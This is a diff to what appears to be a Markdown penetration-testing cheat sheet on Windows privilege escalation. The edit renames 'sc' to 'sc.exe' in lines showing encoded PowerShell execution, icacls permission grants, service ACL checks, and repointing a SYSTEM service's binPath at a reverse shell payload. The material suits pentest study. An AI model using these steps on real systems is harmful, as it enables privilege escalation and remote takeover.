@@ -720,9 +720,9 @@ Run encoded command: ```powershell -EncodedCommand $B64_ENCODED_COMMAND```
 ```icacls "$PATH" /grant $USER:F /T```
 
 **Service Commands** \
-Query the configuration of a service: ```sc qc <service name>``` \
-Query the current status of a service: ```sc query <service name>``` \
-Modify a configuration option of a service: ```sc config <service name> <option>= <value> ``` \
+Query the configuration of a service: ```sc.exe qc <service name>``` \
+Query the current status of a service: ```sc.exe query <service name>``` \
+Modify a configuration option of a service: ```sc.exe config <service name> <option>= <value> ``` \
 Start/Stop a service: ```net start/top <service name>``` \
 
 For services running as SYSTEM, check for weak service permissions (ACL) using ```accesschk.exe``` within Sysinternals: ```accesschk /accepteula -uwcqv user <service name> ``` \
@@ -730,7 +730,7 @@ SERVICE_STOP, SERVICE_START => allow us to start/stop the service\
 SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS => allow us to modify the service config
 
 If we can change the config of a service with SYSTEM priv, we can change the executable of the service to use our custom executable. HOWEVER, we need the permission to start/stop the service. \
-Change the config path of a service, point it to the reverse shell payload: ```sc config <service name> binPath= "\"C:\Users\Public\rev.exe\"" ```, set up a listener and restart the service.
+Change the config path of a service, point it to the reverse shell payload: ```sc.exe config <service name> binPath= "\"C:\Users\Public\rev.exe\"" ```, set up a listener and restart the service.
 
 
 **Check for unquoted service path:** \
